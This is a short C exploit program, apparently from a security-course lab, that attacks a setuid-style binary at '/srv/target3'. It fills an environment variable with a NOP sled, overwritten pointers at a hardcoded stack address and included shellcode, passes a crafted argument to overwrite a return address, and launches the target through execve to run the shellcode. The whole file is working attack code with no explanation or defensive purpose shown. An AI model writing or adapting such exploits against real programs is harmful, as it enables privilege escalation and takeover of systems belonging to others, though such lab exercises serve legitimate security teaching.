#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TGT "/srv/target3"
#define ESZ 400
#define NSZ 201
#define BADDR 0xffffdec0
#define ROFF 4

void mkenv(char *e) {
    memset(e, 0x90, ESZ - 1);
    *((uint32_t *)(e)) = BADDR + ROFF;
    *((uint32_t *)(e + ROFF)) = BADDR + 2 * ROFF;
    memcpy(e + NSZ, shellcode, sizeof(shellcode));
    e[ESZ - 1] = 0;
}

int main() {
    char *a[3], *e[2], env[ESZ], p[20] = {0};
    
    mkenv(env);
    
    memset(p, 0x90, 16);
    *((uint32_t *)(p + 16)) = BADDR;
    
    a[0] = TGT;
    a[1] = p;
    a[2] = 0;
    
    e[0] = env;
    e[1] = 0;
    
    execve(TGT, a, e);
    write(2, "execve failed.\n", 15);
    
    return 0;
}